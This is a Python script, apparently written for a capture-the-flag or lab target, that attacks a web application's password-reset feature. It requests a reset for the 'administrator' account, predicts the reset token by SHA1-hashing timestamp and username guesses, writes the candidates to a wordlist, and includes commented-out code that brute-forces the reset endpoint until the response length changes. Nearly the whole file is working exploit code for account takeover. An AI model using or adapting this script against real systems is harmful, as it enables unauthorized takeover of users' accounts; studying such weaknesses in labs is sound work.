import requests
import datetime
import hashlib
# 
username = 'administrator'
toeknListPath = './tokenLists'


def readWordlistToList(filePath):
    
    list = []
    try:
        with open(filePath, "r") as wordlist:

            for line in wordlist:
                line = line.replace("\n", "")
                line = line.replace(" ", "")
                list.append(line) # Remove "/n"    

            #print("List:", list)
            wordlist.close()
        
        return list
    except FileNotFoundError:
        print("File not found:", filePath)
    except Exception as e:
        print("Error", e)


# Generate Victime reset Token
url = 'http://10.10.46.163:8080/forgot_password'
header = {'Host': '10.10.46.163:8080', 'Content-Length': '14', 'Cache-Control': 'max-age=0', 'Upgrade-Insecure-Requests': '1', 'Origin': 'http://10.10.46.163:8080', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/121.0.6167.160Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Referer': 'http://10.10.46.163:8080/forgot_password', 'Accept-Encoding': 'gzip,deflate,br', 'Accept-Language': 'en-US,en;q=0.9', 'Connection': 'close'}
payloads = {'username':username}


requests.post(url, headers=header, data=payloads)#Without waiting for response !
time = datetime.datetime.now()  #Time record !

tokenT1 = str(time)[:-4] + " . " + username.upper()
print(tokenT1)

# ans = str(time)[:-14]+str(00) 
# print("ans",ans)
# input("stop")
enumerateTokenPrifix = str(time)[:-8] 
print(enumerateTokenPrifix,"FUZZ")

#Generating Protential Tokens ! (Encrypt - Algorithm)

# Generate Token List !!!

with open(toeknListPath, 'w') as file: #Clear File contents
    pass  


#secods

for guessSecods in range(10):

    enumerateTokenA = enumerateTokenPrifix + str(guessSecods) + "."

    # microSeconds
    for guessMicroSecond in range(100):

        if guessMicroSecond < 10:
            enumerateToken = enumerateTokenA + "0" + str(guessMicroSecond) + " . " + username.upper()
            print("token",enumerateToken)
            guessToken = hashlib.sha1(enumerateToken.encode("utf-8")).hexdigest()
            with open("tokenLists",'a') as file:
                
                file.write(guessToken + '\n')
                file.close()
        else: 
            enumerateToken = enumerateTokenA + str(guessMicroSecond) + " . " + username.upper()
            print("token",enumerateToken)
            guessToken = hashlib.sha1(enumerateToken.encode("utf-8")).hexdigest()
            with open("tokenLists",'a') as file:
                file.write(guessToken + '\n')
                file.close()


tokens = readWordlistToList(toeknListPath)

#Using gobuster or wfuzz

### This python not useing mulit thredings

# # Normal Request (resetPassword)
# url = 'http://10.10.46.163:8080/password_reset?token=' + 'ErrorToken'
# originalReponse = requests.get(url)
# OriginBodyLength = len(originalReponse.text)


# # Guess Token


# for token in tokens:
#     url = 'http://10.10.46.163:8080/password_reset?token=' + token
#     response = requests.get(url)
#     print("Attempt",url)
#     print(response.text)
#     if len(response.text) != OriginBodyLength:
#         print("Token Found!!!!")
#         print("toekn",token)
#         print(response.text)
#         break 

# # print("current UserName Not Found!!",username)
# # print("try Another Username or Fix Algorithm")